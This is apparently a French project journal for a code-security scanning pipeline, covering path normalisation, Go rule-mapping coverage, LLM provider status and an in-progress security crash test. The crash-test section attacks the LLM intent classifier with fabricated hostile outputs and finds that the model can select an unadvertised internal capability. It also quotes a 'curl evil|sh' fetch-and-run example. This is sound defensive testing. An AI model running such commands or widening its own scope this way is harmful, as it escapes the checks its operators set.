1. **La forme espacée documentée était cassée.** `README_USAGE.md:14` enseigne
   `--moteur deterministe` ; l'ancien parseur (une boucle qui retirait les jetons
   commençant par `--moteur`) retenait `llm` pour le moteur **et laissait
   « deterministe » comme requête**. Reproduit avant correction :
   `moteur=llm`, `requete="deterministe"`. Corrigé par l'extracteur commun, cas G6/G7.
2. **Le profil et la politique ne parlaient pas le même français.** `Profil.to_dict()`
   émettait `memory_bounded` et `hardened` ; `policy.rego` lit `memoire_bornee`
   (`:93`) et `durci` (`:103`). À ne pas lire, `--confiance=untrusted` n'aurait **rien**
   mesuré : `to_dict()` n'est consommé que par `policy.py:72`, donc OPA recevait un
   champ inexistant — et `not <indéfini>` vaut vrai, donc la garde se déclenchait par
   accident, jamais par mesure ; un profil à mémoire réellement bornée (étape 7)
   n'aurait jamais pu l'armer. Aligné côté producteur ; **cas G15** vérifie désormais,
   sans binaire, que tout `input.profil_sandbox.<champ>` cité dans la politique existe
   dans le profil produit — c'est la classe d'erreur qui est fermée, pas les deux noms.
   `test_intentions.py` n'a pas été modifié : ses dicts `SANS_MEMOIRE`/`AVEC_MEMOIRE`
   utilisaient déjà les noms lus par la politique (c'est parce qu'il court-circuitait le
   producteur que la divergence est restée invisible — d'où G15, qui part du producteur).

**Régression (sandbox Arena, 2026-08-30).** Section G : **14 cas évalués, 14 passés**,
plus 2 **non évalués** (G13 refus réel et G14 contrôle : exigent le binaire `opa`, absent
ici — convention des trois états de `test_correlation.py`, un cas non évalué n'est jamais
compté comme un succès). Les 22 batteries : **5 vertes, 17 bloquées par
l'environnement**, exactement comme avant ce chantier, et pour les mêmes causes vérifiées
à la trace (`binaire OPA introuvable`, `sandbox inutilisable : points de montage
absents`, `artifacts/…` non produit). Aucune nouvelle cause d'échec introduite.
**À relancer sur la machine source** : `test_utilisation` (31 cas attendus),
`test_intentions` (la garde de ressources, maintenant branchée sur le vrai producteur),
`test_bundle` et `test_rapport` (deux clés de plus dans le bundle).

**Ce qui n'est PAS fait, et ne l'était pas dans ce chantier** : `pool.yaml` inchangé
(le registre n'a pas bougé) ; aucun provider, aucune capacité, aucune commande nouvelle ;
`cgroups v2` / runtime OCI toujours absents — `LIMITES_A_PROUVER` reste refusé à l'usage,
donc `--confiance=untrusted` refuse **toujours** tout scan, c'est le comportement voulu
tant que les limites ne sont pas appliquées ; le `mode ACTIF` (étape 7) n'a pas commencé.

---

## Étape 6ter — identité canonique de fichier : `same_file` débloqué (2026-08-30)

**Déclencheur.** Le chantier « normalisation des chemins » du 2026-08-28 relativisait
aux racines connues, mais s'arrêtait là. Quatre formes restaient non canoniques, chacune
vérifiée dans le code ou les artefacts capturés :

```
« ./main.go »                      inchangé  → ne rencontrait pas « main.go »
« foo/../bar.py »                  inchangé  → ne rencontrait pas « bar.py »
« foo\bar.py »                     inchangé  → (Windows ; aucune occurrence sous Linux)
« /PHASE3/testrepo_iac/k8s.yaml »  → « PHASE3/testrepo_iac/k8s.yaml » alors que kics,
                                      trivy et semgrep rendent « k8s.yaml » — 20 findings
                                      checkov RÉELS de la fixture iac, hors corrélation
« /.. »                            → « .. »  : une remontée aplatie en chemin « valide »
```

**Choix de placement, tenu.** La canonicisation est faite au point où le finding devient
canonique (`findings.normalise_chemin`, avant le fingerprint) — `clusterer.py` n'a pas
été touché d'un octet : sa règle reste bête, « mêmes chaînes de fichier → même fichier ».
Un `clusterer` qui devine des parentés de chemins est un `clusterer` qui corrèle ce qui
n'a pas de lien.

**Règles de `normalise_chemin`** (déterministes, sans accès au filesystem) : (0) aucune
marque de chemin → rendu tel quel — un paquet, un asset ou un dépôt n'est pas un chemin,
`golang.org/x/text`, `pkg:npm/lodash`, `go.mod:golang.org/x/text` et `repository` sont
intacts ; (1) séparateurs unifiés ; (2) retrait d'une racine connue **sous toutes ses
formes** puis repli lexical de `.`/`..` ; (3) slash meneur résiduel retiré (hypothèse
isolateur, conservée) ; (4) **remontée hors racine → refus d'aplatir** : `../x` et `/..`
restent ce qu'ils sont, donc restent DISTINCTES de `x` ; (5) sinon tel quel. La racine
gagnée en (2) vient de `pipeline._racines_de()` : montage + cible absolue + cible relative
au dépôt, uniquement des racines connues, jamais une résolution filesystem.

**Ce que la mesure corrige dans la revue externe.** L'exemple canonique demandé
(« Trivy `/mt-scan/app.py:42` ↔ Semgrep `app.py:45` → same_file + ligne_proche ») est
**impossible avec nos données** : `depuis_trivy` ne produit aucune ligne
(`location.line = None`, vérifié à l'exécution — cas 6d). Le cas inter-outils à lignes
proches se joue donc entre outils qui portent des lignes (semgrep ↔ gitleaks), et le
cas trivy est gardé dans la batterie pour que cette limite ne soit jamais tenue pour
acquise.

**Preuves.** `test_chemins.py` : **48 cas évalués, 48 passés, 3 non évalués** (les deux
premiers dépendent des logs de dogfooding, non versionnés ; ils sont passés de « crash »
à « non évalué » — convention des trois états, et la batterie devient verte sur clone
vierge). Dont : A/B mesuré sans dupliquer l'ancien code (8c), et **8a/8b sur les captures
réelles de `testrepo_iac`** — 148 findings (checkov 38 + kics 110) → **5 clusters
inter-outils**, `same_file` + `ligne_proche` sur `main.tf`, `k8s.yaml`, `Dockerfile`, et
**zéro** cluster `same_file` mélangeant deux fichiers (le compte-rendu de clusters est
vérifié membre par membre, pas supposé). Stabilité d'identité mesurée sur les captures
`testrepo_go` : empreintes inchangées, clés restées `main.go` — `test_go.py` (ATTENDUS
« main.go:22 », « main.go:33 ») passe toujours 18/18.

**Conséquence à connaître :** l'identité change là où elle était fausse. Les fingerprints
des 20 findings checkov `k8s.yaml` de la fixture iac se déplacent — donc un bundle ancien
rejoué aujourd'hui rend un `result_digest` différent sur cette cible. C'est le but, pas un
effet de bord ; à déclarer dans toute comparaison avant/après.

**Non fait ici, à faire sur la machine source (B5/B6 complets).** Ce sandbox n'a ni les
outils épinglés, ni réseau, ni `opa` : la mesure d'impact sur dépôts réels reste à faire.

```bash
bash PHASE3/bootstrap.sh && bash PHASE3/reconstruire_fixtures.sh
python3 PHASE3/test_chemins.py && python3 PHASE3/test_utilisation.py && python3 PHASE3/test_go.py
python3 PHASE3/analyser.py PHASE3/testrepo_iac        # clusters inter-outils attendus ≥ 5
(cd PHASE3/dogfooding && python3 lancer.py)          # puis comparer les compteurs de clusters
```

**Dette observée, notée sans correction :** `Sandbox.M_SCAN` est un chemin d'hôte codé en
dur (`/home/user/PHASE3/mt-scan`) — la canonicisation y ancre une première forme, mais la
portabilité réelle demande un montage dynamique ; et la règle (3) continue de rendre
`/home/user/autre/foo.py` en `home/user/autre/foo.py` (hypothèse isolateur assumée) : la
distinction est préservée donc aucun faux lien nait de là, mais la détection d'un chemin
réellement hors cible exigerait un accès filesystem que ce module refuse par contrat.


## Étape 6quater — couverture Go du mapping : le générateur n'apprenait aucun Go (2026-08-30)

**Déclencheur.** La revue a posé le mapping Go comme un problème de **couverture de
données**, pas de logique de clustering — périmètre :
`golang.yaml → extraire_mapping.py → mapping_regles_genere.yaml → clusterer`, moteur de
corrélation interdit. Tenu : `git diff` sur `PHASE3/slice/clusterer.py` = **0 ligne** sur ce
chantier, comme sur le précédent.

**Mesuré avant d'écrire du code** (dans cet ordre) :

1. `slice/mapping_regles_genere.yaml` versionné n'a **pas de clé `golang.yaml`** dans
   `regles_par_fichier` — alors que `bootstrap.sh` épingle quatre jeux depuis
   `2026-08-29` et que `manifeste_dependances.yaml` a le sha256 de `golang.yaml`.
2. `IGNORES` contient `"go"` et `TECHNO_VERS_PAQUET` ne contient **aucune** entrée Go.
   Mais le point qui change la nature du chantier est ailleurs : un `golang.yaml` dont une
   règle porterait `metadata.technology: [golang.org/x/text]` produisait quand même
   **0 entrée** — l'ancien code ne sait que consulter sa table, une technologie inconnue
   est jetée. Mesure directe (ancien générateur importé à côté du neuf, mêmes règles
   synthétiques) : **AVANT 0 entrée · APRÈS 2 entrées** (`golang.org/x/text`,
   `github.com/gin-gonic/gin`). « Régénérer le mapping sur `golang.yaml` » n'aurait donc
   **rien** ajouté : la couverture Go était nulle par construction, pas par oubli d'un tour
   de script.
3. Sur les captures **réelles** de `testrepo_go` : les deux findings semgrep portent
   `technology: [go]` — un langage, pas une dépendance — et trivy déclare
   `golang.org/x/text` (4 CVE) depuis `go.mod`, sans ligne. Soit 6 findings, **0 paquet
   côté semgrep**. La relation inter-outils par dépendance Go n'existe pas dans nos
   données : elle ne doit pas être fabriquée pour faire nombre.

**Pourquoi la forme du paquet est le vrai sujet.** `same_dependency_usage` compare
`location.package` après `.strip().lower()`. Trivy écrit un **chemin de module**,
`metadata.technology` écrit le plus souvent un **nom court** (`gin`). Deux chaînes qui ne
se rencontrent jamais : une entrée `gin` est vivante dans le YAML et morte dans le
clusterer — exactement le genre d'amélioration de statistiques qui ferait croire que C est
fait. La contrainte de forme est donc posée **à la production du mapping**, jamais au
moment du lien.

**Corrections, toutes dans `PHASE3/extraire_mapping.py` :**

- la liste des jeux attendus vient du **manifeste épinglé** (`regles_declarees()`) et non
  d'un `glob` sur le cache ; un jeu épinglé manquant fait **échouer** la génération
  (`--partiel` l'autorise, en l'écrivant dans `regles_absentes`) — une couverture perdue
  en silence se lisait comme un choix ;
- `regles_par_fichier` passe de `int` à `{lues, mappees}` par jeu, et un jeu **lu mais non
  mappé reste écrit** à 0 : « 376 lues, 0 mappée » est un résultat qui s'interprète ;
- garde-fou de forme Go (`paquet_go_valide`) : une technologie Go hors chemin de module est
  **refusée et tracée** dans `refusees` avec son motif ; une technologie Go qui *est* un
  chemin de module entre dans le mapping **sans écriture manuelle** — c'est le chemin par
  lequel la couverture Go se comblera toute seule à la prochaine génération ;
- `valider_tables()` refuse d'écrire si une entrée mappable de la table est annulée par
  `IGNORES`. Anomalie trouvée par ce garde-fou lui-même : `"react": "react"` vivait dans la
  table alors que `IGNORES` contenait `"react"`, testé avant — les règles React étaient
  lues et le lien jeté dans un `continue`. Entrée morte retirée (aucun changement de
  comportement possible, elle ne se déclenchait jamais). La réintroduire suppose de sortir
  `react` d'`IGNORES`, ce qui change la corrélation sur tout dépôt React : **dette**, pas
  correction de ce chantier ;
- le comptage est par **règle** et non par clé de dictionnaire (une règle mappée écrit deux
  clés, identifiant complet + forme courte) — les compteurs du YAML sont donc sous le
  régime « ce que le générateur a vu », pas « ce qu'il a écrit de lignes ».

**Harnais.** `PHASE3/test_mapping_go.py` (nouvelle batterie, hors ligne, aucun outil
requis — `extraire_mapping.py` n'avait de tests nulle part, et les batteries candidates
dépendent d'`opa`) : **17/17 cas vérifiés · 1 non évalué**. Les cas qui comptent :

- A1/A2/A3 autorité du manifeste, tables incohérentes → génération refusée ;
- B1–B4 `lues`/`mappees`, jeu à 0 mappé conservé, `regles_absentes`, échec en mode strict ;
- C1–C5 refus du nom court, acceptation du chemin de module ;
- **D1/D2 négatif sur données réelles** : 0 paquet sur les findings semgrep Go de
  `testrepo_go`, donc **0 cluster inter-outils** ; F : un module vulnérable chez trivy sans
  règle semgrep pour le nommer ne produit **aucun** cluster ;
- **E1/E2 le critère d'acceptation** : dès qu'une règle nomme le module
  (`go.github.gin.g15.xss` → `github.com/gin-gonic/gin`) et que l'outil de dépendances
  déclare le même, les deux findings aboutissent sur **une seule** clé de paquet et forment
  un cluster `cross_tool` + `same_dependency_usage`. Le mapping de cet état est produit par
  le générateur dans un répertoire temporaire, injecté par le cache de lookup déjà existant
  de `findings` (`F._MAPPING_GENERE`) — aucun trou ajouté au code de production.

**Balayage après ce chantier :** 7 batteries vertes sur 23 (la 23e est `test_mapping_go.py`),
et les 16 rouges gardent exactement leurs causes d'avant — `opa` absent de ce sandbox (×10),
`artifacts/` et manifeste de mission absents faute d'une exécution préalable (×2), cache de
règles absent pour `test_securite`, `GROQ_API_KEY` absente pour `test_llm_reel`. Aucune
régression imputable à ce chantier : `test_chemins` 48/48, `test_go` 18/18,
`test_rapport_humain` 18/18, `test_selection` 13/13, `test_extraction_blocs` 14/14.

**Ce qui reste à faire, et c'est la seule mesure qui tranche.** Ni `semgrep.dev` ni le
cache de règles ne sont atteignables ici (`curl` → 000), donc `golang.yaml` n'a pas pu
être régénéré dans ce sandbox : le fichier versionné garde son ancien format (`int` par
fichier, pas de champ de comptabilité) et **n'a pas été édité à la main**, parce que c'est
une donnée générée. Sur la machine source :

```bash
python3 PHASE3/extraire_mapping.py      # lire « golang.yaml : N lues · M mappées »
python3 PHASE3/test_mapping_go.py       # le cas G passe tout seul si le cache est là
```

`M = 0` ⇒ aucune règle de `p/golang` ne nomme de dépendance ⇒ **la corrélation Go n'est
pas codable maintenant**, même verdict que le mapping npm consigné dans
`DOGFOODING_BILAN.md`, et ce verdict est alors une fin de chantier, pas un échec.
`M > 0` ⇒ vérifier que les paquets mappés sont des chemins de module (le garde-fou l'a déjà
trié) puis rejouer `analyser.py PHASE3/testrepo_go` et comparer le nombre de clusters
inter-outils avant/après — l'unique façon de dire que C a changé quelque chose.


## Clarification — LLM réel testé ≠ LLM réel validé en production (2026-08-30)

**Occasion.** Deux phrases du même fichier s'annulaient l'une l'autre, sans date ni périmètre :
« **Aucun vrai modèle testé** » (section Phase 6) et « **Le LLM a été testé avec Groq** »
(liste de dettes). Les deux étaient vraies à des moments différents, et le lecteur de passage
ne pouvait pas le savoir. La correction est donc en trois temps : dater, borner, séparer
l'intégration de la validation.

**Ce qui est écrit dans le code, et vérifiable sans clé :**

- le fournisseur branché sur le chemin utilisateur est `Groq` (`PHASE3/analyser.py:182,186`
  — `moteur="auto"` ne lève `Groq()` que si `GROQ_API_KEY` est dans l'environnement ; sinon
  repli déterministe assumé) ;
- endpoint `https://api.groq.com/openai/v1/chat/completions`, modèle par défaut
  `openai/gpt-oss-120b`, surchargeable par `GROQ_MODELE`, timeout 60 s ; la clé vient de
  l'environnement, n'est jamais écrite dans un fichier et n'est jamais affichée en entier ;
- `OpenAICompatible` est écrit et **jamais exercé** : aucun chemin du CLI ne l'instancie.

**Ce qui a été réellement observé, et comment on le sait :** le commentaire de
`slice/fournisseurs_llm.py` consigne qu'un `llama-3.3-70b-versatile` demandé sur ce compte a
répondu **404** (modèle retiré, d'où le défaut surchargeable listé depuis
`/openai/v1/models`), et qu'un appel sans agent normal est refusé par Cloudflare (403 code
1010). Ce sont des réponses d'un vrai service, pas d'un mock : c'est la trace la plus solide
d'appels réels que ce dépôt contienne. `MASTER_PROMPT.md` §6 documente la limite de débit :
appels rapprochés = échecs intermittents, et **bascule silencieuse** vers le moteur de
secours — c'est-à-dire, à l'époque, un risque de confusion entre « le modèle a dit non » et
« le modèle n'a pas répondu ».

**Trois états, à ne jamais mélanger :**

| État | Question | Où on en est |
|---|---|---|
| jamais exercé | le contrat tient-il contre un vrai modèle ? | faux : il l'a été, trace ci-dessus |
| **exercé / intégré** | le contrat tient-il sur une série de phrases, avec un fournisseur réel ? | oui, sur les 11 points de `test_llm_reel.py` — **mais non rejouable ici** : sans clé, la batterie sort en code 2 |
| **validé en production** | tient-il sous débit, pannes, variations de modèles, entrées hostiles, à l'échelle d'une campagne ? | **non.** Rien de mesuré ne le dit |

**Ce que « validé en production » exigerait et qui n'existe pas encore :** une politique de
relance et de file d'attente avec budget de latence chiffré ; un relevé du taux de repli
déterministe *pendant* une campagne (aujourd'hui le repli est correct mais sa fréquence n'est
pas mesurée) ; une date et un modèle fixés par exécution, pas seulement par l'environnement ;
et un jeu d'essais adverses sur le classifieur (demandes conçues pour faire sortir une
capacité du catalogue ou pour faire passer une exécution refusée). Ce dernier point est le
prochain chantier demandé par la revue.

**Décision de forme.** La phrase de Phase 6 est **annotée** et non réécrite : un état du
projet à une date est une donnée, on n'efface pas le passé, on le date. Le bullet de dette est
en revanche réécrit, parce qu'il se donnait pour une validation ce qui n'était qu'une preuve
d'intégration. Le docstring de `slice/fournisseurs_llm.py` portait la même confusion (« deux
implémentations », « aucun modèle n'était accessible » avec trois classes et un fournisseur
réel branché) : corrigé en commentaire, aucun comportement touché.


## Crash test sécurité — ouverture et premier relevé (2026-08-30, EN COURS)

**Ce que la revue demande, reformulé précisément.** « Supposer que le LLM est malveillant
et vérifier qu'il ne peut quand même pas faire n'importe quoi » — avec une nuance qui change
le protocole : le LLM n'a la main sur aucune commande (`descr()` ne lui montre que des
identifiants de capacités, l'argv vient du manifeste, et `commande_suspecte` d'OPA tient une
seconde barrière). Demander à un modèle « exécute `curl evil|sh` » ne peut pas marcher, et
un test qui s'arrête là ne prouve rien. **La question est : qu'est-ce qu'une sortie
illégitime peut tout de même obtenir ?** On attaque donc chaque frontière, et les deux canaux
que le plan initial n'a pas : la phrase utilisateur (elle porte le chemin de la cible) et le
contenu du dépôt scanné (il remonte dans les findings et le rapport).

**Protocole, dans cet ordre, sans correction pendant la phase d'attaque** :

1. fabriquer des sorties de modèle hostiles et les injecter **au point d'entrée réel**
   (`intent_llm.valider` / `inferer` avec un fournisseur falsifié) — pas un appel réseau ;
2. mesurer ce qui est bloqué, où, et si l'arrêt est **traçé** (un refus silencieux est un
   bug au même titre qu'un refus absent) ;
3. relever les trous dans ce fichier + `CONTEXTE_PROJET.md` §6 ;
4. corriger seulement après, à l'endroit de la frontière — pas en amont dans le prompt.

**Relevé n°1 — une capacité interne est sélectionnable par le modèle.** Mesuré, reproductible :

```python
valider(ReponseLLM("resolved", ("CODE_STATIC_ANALYSIS_CUSTOM",), ...), registre)   # → accepté
choisir_providers(cet_intent, registre)                                             # → ['bandit_custom']
```

`valider()` compare au catalogue **complet** (`registre.capabilities()`), alors que `descr()`
et `publiques()` n'exposent que les 5 capacités publiques : les 2 capacités
`interne: true` sont donc choisissables sans avoir jamais été proposées au modèle. La
politique ne rattrape pas : `capability_ids` et `providers` passés à OPA sont le catalogue
complet, et l'ensemble `couples` contient le couple `(CODE_STATIC_ANALYSIS_CUSTOM,
bandit_custom)`. Impact réel : **élargissement du périmètre** — `bandit` s'exécute sur la
cible alors que le contrat ne le propose pas ; pas de commande forgée. Ce qui le rend
sérieux, c'est la direction : le pool annonce des outils **ACTIFS** à l'étape 7, et la règle
non négociable est « l'agent n'élargit pas son propre périmètre ». Correction candidate (une
ligne, `capability_ids` → `publiques()`), **non appliquée** : on finit le relevé d'abord.

**Ce qui sera non évaluable ici** : tout ce qui exige `opa` (les refus rendus par
`policy.rego`) — le binaire n'est pas récupérable dans ce sandbox. Les cas concernés seront
marqués non évalués, pas simulés ; et `policy.rego` reste **lu** (les règles `couples`,
`provider_hors_capacite`, `commande_suspecte`, `registre_divergent` sont vérifiables à la
lecture, c'est comme ça que le relevé n°1 est établi sans OPA).
